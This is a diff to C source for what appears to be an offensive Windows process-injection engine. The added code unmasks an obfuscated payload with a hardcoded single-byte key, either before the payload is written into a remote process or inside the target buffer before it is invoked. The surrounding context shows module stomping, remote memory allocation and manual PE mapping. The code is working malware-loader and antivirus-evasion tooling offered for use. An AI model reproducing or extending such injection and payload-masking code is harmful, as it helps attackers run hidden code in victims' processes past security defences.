@@ -626,7 +626,7 @@ BOOL EngineExecute(PINJECTION_ENGINE engine,
 
     printf("[+] Initializing resolvers.\n");
     InitializeResolvers(ctx);
-    
+
     // For module stomping, we need to locate the target address and set ctx->pRemoteAddress
     // todo: refactor this to move all the module stomping logic from EngineExecute
     if(ctx->enableStomping) {
@@ -695,12 +695,89 @@ BOOL EngineExecute(PINJECTION_ENGINE engine,
         printf("[+] Space allocated RW at: 0x%p\n", ctx->pRemoteAddress);
     }
 
+    printf("[DEBUG] unmaskForWrite = %s\n", ctx->unmaskForWrite ? "TRUE" : "FALSE");
+    if(ctx->unmaskForWrite) {
+        uint8_t key = 0x5A;              /* default */
+        //printf("[DEBUG] Lookup on algo: %s\n", ctx->unmaskInvokeAlgo);
+        mask_algo_t *algo = mask_find(ctx->unmaskWriteAlgo);
+
+        /*printf("[DEBUG] Buffer=%p\n", ctx->pRemoteAddress);
+        printf("[DEBUG] Size=%zu\n", ctx->payloadSize);
+        printf("[DEBUG] Algo=%p\n", (void*)algo);
+        printf("[DEBUG] Key=%02X\n", key);    */
+        
+        if (!algo) {
+            printf("[ERROR] Unknown algorithm: %s\n",
+            ctx->unmaskWriteAlgo);
+            return 1;
+        }        
+        //  unmasking for the write stage means unmasking the payload
+        //  this could be changed to unmask the payload into the target buffer, leaving the masked source
+        mask_entry_t entry = {
+            .buffer = ctx->payload,
+            .size   = ctx->payloadSize,
+            .ctx    = &key,
+            .algo   = algo
+        };
+
+        __try
+        {
+            printf("[DEBUG] Running unmask_execute\n");
+            unmask_execute(&entry);
+            printf("[DEBUG] Unmask complete\n");
+        }
+        __except(EXCEPTION_EXECUTE_HANDLER)
+        {
+            DWORD code = GetExceptionCode();
+            printf("[UNMASK EXCEPTION] 0x%08X\n", code);
+        }
+        printf("[DEBUG] Unmask complete\n");
+    }
+
     if (IsPayloadPE(pPayload)) {
         printf("[+] Writing payload with ManualMapWrite.\n");
         ManualMapWrite(ctx, pPayload);
     } else {
         printf("[+] Writing payload.\n");
         engine->Write(ctx, pPayload);
+    }
+
+    printf("[DEBUG] unmaskForInvoke = %s\n", ctx->unmaskForInvoke ? "TRUE" : "FALSE");
+    if(ctx->unmaskForInvoke) {
+        uint8_t key = 0x5A;              /* default */
+        //printf("[DEBUG] Lookup on algo: %s\n", ctx->unmaskInvokeAlgo);
+        mask_algo_t *algo = mask_find(ctx->unmaskInvokeAlgo);
+
+        /*printf("[DEBUG] Buffer=%p\n", ctx->pRemoteAddress);
+        printf("[DEBUG] Size=%zu\n", ctx->payloadSize);
+        printf("[DEBUG] Algo=%p\n", (void*)algo);
+        printf("[DEBUG] Key=%02X\n", key);    */
+        
+        if (!algo) {
+            printf("[ERROR] Unknown algorithm: %s\n",
+            ctx->unmaskInvokeAlgo);
+            return 1;
+        }        
+        //  unmasking for the invoke stage should unmask the target buffer
+        mask_entry_t entry = {
+            .buffer = ctx->pRemoteAddress,
+            .size   = ctx->payloadSize,
+            .ctx    = &key,
+            .algo   = algo
+        };
+
+        __try
+        {
+            printf("[DEBUG] Running unmask_execute\n");
+            unmask_execute(&entry);
+            printf("[DEBUG] Unmask complete\n");
+        }
+        __except(EXCEPTION_EXECUTE_HANDLER)
+        {
+            DWORD code = GetExceptionCode();
+            printf("[UNMASK EXCEPTION] 0x%08X\n", code);
+        }
+        printf("[DEBUG] Unmask complete\n");
     }
 
     printf("[+] Adjusting permissions.\n");
